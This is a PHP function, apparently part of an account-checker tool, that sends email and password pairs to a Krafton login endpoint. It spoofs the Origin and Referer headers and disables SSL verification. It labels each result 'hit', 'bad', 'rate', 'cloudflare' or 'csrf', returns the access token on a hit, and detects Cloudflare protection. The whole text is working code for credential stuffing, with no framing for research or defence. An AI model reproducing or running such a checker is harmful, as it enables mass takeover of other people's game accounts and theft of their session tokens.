function krafton_login($email, $password, $ua) {
    $payload = json_encode([
        'email'             => $email,
        'password'          => $password,
        'trusted_device'    => false,
        'client_id'         => 'local',
        'activationVersion' => 'v2',
    ], JSON_UNESCAPED_UNICODE);

    $ch = curl_init(KRAFTON_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_TIMEOUT        => 25,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING       => '',
        CURLOPT_USERAGENT      => $ua,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'Origin: https://accounts.krafton.com',
            'Referer: https://accounts.krafton.com/',
            'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8',
        ],
    ]);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_error($ch);
    curl_close($ch);

    if ($err) return ['status' => 'curl', 'message' => 'cURL: ' . $err];
    if ($code === 429) return ['status' => 'rate', 'message' => 'Rate limit'];
    if ($code === 404) return ['status' => 'endpoint', 'message' => 'Endpoint 404'];

    // Cloudflare mı döndü?
    if (stripos($body, 'cloudflare') !== false || stripos($body, 'cf-chl') !== false) {
        return ['status' => 'cloudflare', 'message' => 'Cloudflare koruması aktif, curl geçemiyor'];
    }

    $json = json_decode($body, true);
    if (!is_array($json)) {
        return ['status' => 'parse', 'message' => 'JSON değil', 'raw' => substr($body, 0, 300)];
    }

    if ($code === 200 && !empty($json['access_token'])) {
        return ['status' => 'hit', 'message' => 'Giriş başarılı', 'token' => $json['access_token']];
    }

    $errCode = $json['errorCode'] ?? null;
    if ($errCode === 1 || $errCode === 2) return ['status' => 'bad', 'message' => 'Hatalı bilgiler'];
    if ($errCode === 5) return ['status' => 'csrf', 'message' => 'CSRF istendi (403)'];

    return ['status' => 'fail', 'message' => $json['message'] ?? 'Bilinmeyen hata'];
}